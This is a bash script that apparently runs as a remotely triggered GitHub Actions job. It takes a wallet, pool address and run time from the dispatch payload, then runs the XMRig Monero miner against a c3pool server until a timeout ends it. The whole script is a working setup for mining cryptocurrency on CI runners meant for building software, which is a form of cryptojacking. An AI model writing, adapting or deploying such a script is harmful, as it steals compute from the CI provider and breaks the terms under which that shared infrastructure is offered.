#!/bin/bash

# api变量解析
# ./tmp/curlauto.sh kukutt token actions xmrig '{"wallet": "xxxxxxxx", "sleeptime": "10000", "poolserver": "mine.c3pool.com:13333", "poolcmd": "-p x -k"}'
jswallet=`cat $GITHUB_EVENT_PATH | jq ".client_payload.wallet" | sed 's/\"//g'`
jssleeptime=`cat $GITHUB_EVENT_PATH | jq ".client_payload.sleeptime" | sed 's/\"//g'`
jspoolserver=`cat $GITHUB_EVENT_PATH | jq ".client_payload.poolserver" | sed 's/\"//g'`
jspoolcmd=`cat $GITHUB_EVENT_PATH | jq ".client_payload.poolcmd" | sed 's/\"//g'`

echo $jswallet $jsxmrigname $jssleeptime $jspoolserver $jspoolcmd

#git clone https://github.com/xmrig/xmrig.git
#[ -n "$LOCALTEST" ] || sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
[ -n "$LOCALTEST" ] || sudo apt-get install libuv1-dev libssl-dev libhwloc-dev -y
#[ -n "$LOCALTEST" ] || sudo apt-get install automake libtool autoconf -y
#cd xmrig
#mkdir -p build
#cd build
#cmake ../
#make
#./xmrig --help
echo "timeout $jssleeptime ./xmrig -o $jspoolserver -u $jswallet $jspoolcmd"
timeout $jssleeptime ./xmrig -o $jspoolserver -u $jswallet $jspoolcmd
killall xmrig
